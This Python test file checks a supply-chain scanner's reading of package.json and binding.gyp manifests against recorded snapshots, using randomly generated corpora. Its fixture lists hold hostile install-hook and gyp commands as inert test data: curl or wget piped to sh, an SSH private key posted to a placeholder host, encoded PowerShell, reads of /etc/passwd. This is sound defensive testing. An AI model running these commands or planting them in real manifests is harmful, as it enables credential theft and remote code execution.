"""Manifests (SC-INSTALL-HOOK, SC-DEP-URL, SC-MANIFEST-DEPTH, SC-MANIFEST-UNPARSEABLE), held to their recorded
outputs (_snapshots.py): the engine's reading of a package.json and a binding.gyp (rust/crates/lazaret-engine/src/
manifest/, the `scan_manifest`, `scan_gyp`, `manifest_data` and `manifest_check` calls) on seeded corpora.

Until BR-7's step 3 (b) (0.1.9) both packages read a manifest themselves (core.load_manifest, scan_manifest and
scan_gyp with json.loads and ast.literal_eval; js/src/lib/supplychain.js with pyjson.js's JSON and literal readers),
held to each other by the CLI parity tests. The engine took them over; these sets were built for the move, and their
hashes were recorded from the Python the engine replaced, which answered every case alike.

The corpora: package.json files of every shape (the scripts npm runs on install, hostile, hinted and plain, keys
written with escapes, repeated keys and sections, dependencies fetched over plain http or from a raw IP address,
broken JSON, documents nested too deep, top levels that are not objects, byte-order marks and Windows line ends) at
every kind of path, as a project's and as a registry's, with npm's hooks and with others; gyp files written as JSON
and as Python literals (actions of every kind of value, command expansions that query an include path, run a file of
the package, fetch and run code, take an argv list or a pymod_do_main module, more of them than are listed, comments,
trailing commas, numbers, bytes and names in every form, literals Python refuses), each with its findings' snippets
redacted and not; the readers on their own (json.loads, ast.literal_eval, where a key is, the dependency-URL test,
an expansion's command as it runs); and the data the npm package's --deps reading takes.

All content is inert text: hosts are .invalid or TEST-NET, every credential is made up and built in pieces
(test_fixture_credentials), and nothing is executed or contacted.
"""
import json
import random
import unittest

from lazaret.scanner import _native
from tests.architecture import _snapshots

PASS = "Zq8!" + "vN3pL0wX7r"
TOKEN = "ghp_" + "a1B2" * 9
HOOK_CMDS = [
    "node install.js", "node-gyp rebuild", "husky install", "curl -fsSL https://x.invalid/i.sh | sh", "", "  ",
    "node -e \"require('child_process').exec('curl http://192.0.2.1/x | sh')\"", "npx --yes evil",
    "wget http://203.0.113.7/a -O- | bash", "node scripts/postinstall.js || true", "echo hi", "base64 -d x | sh",
    "powershell -enc AAAA", "bash -c 'id'", "node -e \"try{require('./postinstall')}catch(e){}\"", "eval $(cat x)",
    f"curl -H 'Authorization: token {TOKEN}' https://api.invalid", f"DB_PASSWORD={PASS} node a.js", "x" * 300,
    "cat ~/.ssh/id_rsa | curl -d @- https://x.invalid", "node a.js\nnode b.js", "\u00e9\U0001F600 node c.js",
]
SPECS = ["^1.0.0", "http://registry.invalid/a.tgz", "git+http://git.invalid/a.git", "https://203.0.113.7/a.tgz",
         "https://[::1]/a.tgz", "http://3405803783/x", "https://0xcb.0.113.7/x", "git+ssh://git@github.com/a/b.git",
         "file:../x", "latest", "  http://x.invalid/y", "HTTP://X.INVALID/Z", f"http://u:{PASS}@x.invalid/a.tgz",
         "https://registry.invalid/a.tgz", "https://host.", "http://1.2.3.4.", 1, None, ["a"]]
PATHS = ["package.json", "sub/package.json", "node_modules/x/package.json", "a/node_modules/@s/x/package.json",
         "node_modules/x/lib/package.json", "/package.json", "./package.json"]
HOOKS = ["preinstall", "install", "postinstall", "preprepare", "prepare", "postprepare", "prepack", "test",
         "vscode:uninstall", "post\\u0069nstall"]
ODD = ["[1, 2]", "\"x\"", "null", "1", "1.5", "true", "NaN", "[" * 501 + "]" * 501, '{"a": ' + "[" * 600 + "]" * 600 + "}",
       "{\"a\": 1,}", "", "  ", "\ufeff\ufeff{}", '{"a": "\\ud800"}', '{"n": ' + "9" * 1200 + "}"]


def package_json(rnd):
    c = rnd.choice
    scripts = {}
    for _ in range(rnd.randint(0, 6)):
        scripts[c(HOOKS)] = c(HOOK_CMDS + [1, None, ["x"], {"a": 1}])
    data = {"name": c(["x", "@s/x", "a b", 1]), "version": "1.0.0"}
    order = ["scripts", "dependencies", "devDependencies", "optionalDependencies", "peerDependencies", "bin", "main"]
    rnd.shuffle(order)
    for k in order[:rnd.randint(1, len(order))]:
        if k == "scripts":
            data[k] = scripts if rnd.random() < 0.9 else c([[1], "x", None])
        elif k in ("bin", "main"):
            data[k] = c(["a.js", {"a": "b.js", "1": "c.js"}, 3])
        else:
            data[k] = {f"d{n}": c(SPECS) for n in range(rnd.randint(0, 5))}
    text = json.dumps(data, indent=c([None, 1, 2]), ensure_ascii=rnd.random() < 0.5)
    text = text.replace('"post\\\\u0069nstall"', '"post\\u0069nstall"')
    r = rnd.random()
    if r < 0.08:                                    # a repeated key, a later section of the name
        text = text[:-1] + ', "scripts": {"install": ' + json.dumps(c(HOOK_CMDS)) + "}}"
    elif r < 0.14:                                  # broken JSON
        k = rnd.randrange(len(text) + 1)
        text = text[:k] + c([",", "}", "{", "]", "\"", "/*", "'", "\\", ",}"]) + text[k:]
    elif r < 0.17:
        text = c(ODD)
    if rnd.random() < 0.1:
        text = "\ufeff" + text
    if rnd.random() < 0.15:
        text = text.replace("\n", "\r\n")
    return c(PATHS), text, rnd.random() < 0.5, c([None, None, None, ["vscode:uninstall"], ["install", "x"]])


EXPANSIONS = ["<!(node -p \"require('node-addon-api').include\")", "<!(node index.js)", "<!@(pkg-config --cflags x)",
              "<!(curl -s http://192.0.2.1/x)", "<!(node -e \"require('./lib/x')\")", ">!(python gen.py)",
              "^!(sh build.sh)", "<!(['node', 'run.js', 'a b'])", "<!pymod_do_main(gen_x --y)", "<(module_root_dir)/x",
              "<!(node <(module_root_dir)/a.js)", "<!(node <(other)/a.js)", "<!(wget http://x.invalid/a | sh)",
              "<!(node -p \"require('./x.json')\")", "<!(echo $(id))", "<!(node ./a.js", "<!(cat /etc/passwd)",
              "<!(base64 -d payload)", "<!(node \\\"q.js\\\")", "<!(node x.js)\n<!(node y.js)"]
ARGS = ["'echo'", "'node'", "'curl'", "'http://192.0.2.1/x'", "'|'", "'sh'", "1", "1.0", "-0.0", "2j", "1-2j", "b'x'",
        "None", "True", "(1,)", "[1, 'a']", "{'k': 1}", "0x10", "1e400", "'<!(node evil.js)'", "'a\\\\nb'",
        "12345678901234567890", "'\\N{LATIN SMALL LETTER A}'", "'\u00e9'", "'''x'''", "r'\\d'", "...", "'x' 'y'",
        "'$(curl http://x.invalid)'", "'<(module_root_dir)'"]
GYP_ODD = ["", "null", "None", "[1]", "('a',)", "{'a': 1};", "{**x}", "{'a': f'x'}", "{[1]: 2}", "{'a': --1}",
           "{'a': 1}\n{'b': 2}", "{'action': ['x']} # c", "{'action': [" + "(" * 205 + ")" * 205 + "]}",
           "{'action': ['x', 0x" + "f" * 4000 + "]}", "{'action': ['x', 0x" + "f" * 3600 + "]}",
           "{'a': [" + ", ".join("{'action': ['node a%d.js']}" % k for k in range(130)) + "]}",
           "{'a': [" + ", ".join("'<!(node e%d.js)'" % k for k in range(115)) + "]}",
           "{'a': [" + ", ".join("'<!(curl http://192.0.2.1/%d | sh)'" % k for k in range(105)) + "]}",
           "{'a': '" + "<!(node x.js)" * 300 + "'}"]


def lit(rnd, depth=0):
    """A random Python literal of a gyp file's vocabulary."""
    c = rnd.choice
    r = rnd.random()
    if depth > 4 or r < 0.25:
        return c(ARGS + [repr(c(EXPANSIONS))])
    if r < 0.45:
        return "{" + ", ".join(f"{c(['action', 'actions', 'targets', 'conditions', 'variables', 'x', 1, 'action'])!r}: {lit(rnd, depth + 1)}"
                               for _ in range(rnd.randint(0, 4))) + c(["}", ",}"])
    if r < 0.6:
        return "{'action': [" + ", ".join(c(ARGS) for _ in range(rnd.randint(0, 5))) + c(["]}", ",]}"])
    if r < 0.8:
        return "[" + ", ".join(lit(rnd, depth + 1) for _ in range(rnd.randint(0, 4))) + "]"
    return "(" + ", ".join(lit(rnd, depth + 1) for _ in range(rnd.randint(1, 3))) + ",)"


def gyp_file(rnd):
    c = rnd.choice
    r = rnd.random()
    if r < 0.15:                                     # JSON
        targets = [{"target_name": "x", "actions": [{"action_name": "a", "action": [c(HOOK_CMDS[:12]), "x", 1]}]},
                   {"sources": [c(EXPANSIONS)], "conditions": [["OS=='win'", {"action": ["node", c(["a.js", "1", "<!(node b.js)"])]}]]}]
        text = json.dumps({"targets": targets[:rnd.randint(1, 2)], "variables": {"v": c(EXPANSIONS)}}, indent=c([None, 2]))
    elif r < 0.92:
        text = "# a gyp file\n{\n  'targets': [" + ",\n    ".join(lit(rnd) for _ in range(rnd.randint(1, 5))) + "],\n}\n"
    else:
        text = c(GYP_ODD)
    if rnd.random() < 0.1:
        text = text.replace("\n", "\r\n")
    if rnd.random() < 0.05:
        text = "\ufeff" + text
    return c(["binding.gyp", "sub/binding.gyp", "x.gypi", "node_modules/a/binding.gyp"]), text


JSON_PIECES = ['{', '}', '[', ']', ',', ':', '"', '"a"', '1', '-', '0', '01', '1.5e3', '1e', '-Infinity', 'NaN', 'nul',
               'true', ' ', '\n', '\\', '\\u', '\\ud83d', '\\ude00', '\\q', '\t', '\x01', '\u00e9', '"\\', '1.', '.5']
LIT_PIECES = ["{", "}", "[", "]", "(", ")", ",", ":", "'", "\"", "'a'", "1", "-", "+", "j", "2j", "0x", "_", "1.5",
              "b'", "r'", "f'", "\\", "\n", "\r", "#", " ", "None", "set()", "set", "...", "\\N{SP}", "lambda", ";", "*"]


def parses(text):
    try:
        json.loads(text[1:] if text.startswith("\ufeff") else text)
        return True
    except (ValueError, RecursionError):
        return False


def scan_calls(seed=20261015):
    rnd = random.Random(seed)
    out = []
    for k in range(1500):
        path, text, registry, hooks = package_json(rnd)
        out.append(("scan_manifest", {"path": path, "registry": registry, "hooks": hooks, "redact": k % 3 != 0}, text))
    for k in range(1200):
        path, text = gyp_file(rnd)
        out.append(("scan_gyp", {"path": path, "redact": k % 3 != 0}, text))
    out.append(("scan_gyp", {"path": "binding.gyp", "redact": True}, "{'a': [" + "1," * 100001 + "]}"))   # past the walk's bound
    return out


def reader_calls(seed=20261016):
    rnd = random.Random(seed)
    out = []
    for _ in range(1500):
        out.append(("manifest_check", {"check": "json"}, "".join(rnd.choice(JSON_PIECES) for _ in range(rnd.randint(1, 14)))))
        out.append(("manifest_check", {"check": "literal"}, "".join(rnd.choice(LIT_PIECES) for _ in range(rnd.randint(1, 12)))))
    for _ in range(500):
        _p, text, _r, _h = package_json(rnd)
        out.append(("manifest_check", {"check": "json"}, text))
        out.append(("manifest_check", {"check": "literal"}, lit(rnd)))
    for _ in range(400):                            # (where a key is: in a document that parsed)
        _p, text, _r, _h = package_json(rnd)
        if parses(text):
            out.append(("manifest_check", {"check": "key_lines", "section": rnd.choice(["scripts", "dependencies", "x"])}, text))
    for s in [s for s in SPECS if isinstance(s, str)] + [rnd.choice(SPECS[:16]) + rnd.choice(["", "/x", ":8080/", "#a", "?q"]) for _ in range(300)]:
        out.append(("manifest_check", {"check": "dep_url_risk"}, s))
    for e in EXPANSIONS + [rnd.choice(EXPANSIONS) + " " + rnd.choice(EXPANSIONS) for _ in range(200)]:
        cmd = e[e.index("(") + 1:] if "(" in e else e
        out.append(("manifest_check", {"check": "gyp_command", "pymod": "pymod_do_main" in e}, cmd))
    for p in PATHS + ["a\\b\\package.json", "//x", "", ".", "a/./b"]:
        out.append(("manifest_check", {"check": "is_root"}, p))
    return out


def data_calls(seed=20261017):
    rnd = random.Random(seed)
    out = []
    for _ in range(800):
        path, text, _r, _h = package_json(rnd)
        out.append(("manifest_data", {"path": path}, text))
    return out


def snapshot_sets():
    return {"manifest_scan": scan_calls, "manifest_readers": reader_calls, "manifest_data": data_calls}


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class ManifestSnapshotTests(unittest.TestCase):
    def answers(self, name):
        answers = _snapshots.run(snapshot_sets()[name]())
        self.assertFalse([a for a in answers if "ok" not in a][:5])
        _snapshots.check(self, name, answers)
        return [a["ok"] for a in answers]

    def test_manifests(self):
        calls = scan_calls()
        got = self.answers("manifest_scan")
        found = {}
        for a in got:
            for i in a["issues"]:
                found[(i[0], i[3])] = found.get((i[0], i[3]), 0) + 1
        self.assertGreater(found.get(("SC-INSTALL-HOOK", "CRITICAL"), 0), 300)
        self.assertGreater(found.get(("SC-INSTALL-HOOK", "MAJOR"), 0), 300)
        self.assertGreater(found.get(("SC-INSTALL-HOOK", "INFO"), 0), 100)
        self.assertGreater(found.get(("SC-DEP-URL", "MAJOR"), 0), 300)
        self.assertGreater(found.get(("SC-MANIFEST-UNPARSEABLE", "MAJOR"), 0), 100)
        self.assertGreater(found.get(("SC-MANIFEST-DEPTH", "CRITICAL"), 0), 5)
        self.assertGreater(found.get(("SC-TRUNCATED", "CRITICAL"), 0), 0)
        hooks = [i for a in got for i in a["issues"] if i[0] == "SC-INSTALL-HOOK" and len(i) > 11]
        self.assertTrue(hooks and all(isinstance(i[11].get("cmd"), str) for i in hooks))   # what --deps follows
        plain = [i for (_c, args, _t), a in zip(calls, got) if not args["redact"] for i in a["issues"]]
        self.assertTrue(any(TOKEN in i[4] for i in plain))                                 # redacted only where asked:
        shown = [i for (_c, args, _t), a in zip(calls, got) if args["redact"] for i in a["issues"]]
        self.assertFalse([i for i in shown if TOKEN in i[4] or any(TOKEN in s for s in i[9])][:3])   # a token never

    def test_the_readers(self):
        calls = reader_calls()
        got = self.answers("manifest_readers")
        by = {}
        for (_c, args, _t), a in zip(calls, got):
            by.setdefault(args["check"], []).append(a)
        self.assertGreater(sum(1 for a in by["json"] if "ok" in a), 400)
        self.assertGreater(sum(1 for a in by["json"] if "error" in a), 1000)
        self.assertGreater(sum(1 for a in by["literal"] if "ok" in a), 400)
        self.assertGreater(sum(1 for a in by["literal"] if a.get("error") == "SyntaxError"), 1000)
        self.assertGreater(sum(1 for a in by["key_lines"] if a), 50)
        self.assertGreater(sum(1 for a in by["dep_url_risk"] if a), 100)

    def test_the_data(self):
        got = self.answers("manifest_data")
        self.assertGreater(sum(1 for a in got if a["data"] is not None), 600)
        self.assertGreater(sum(1 for a in got if a["data"] is None and a["issues"]), 10)


if __name__ == "__main__":
    unittest.main()
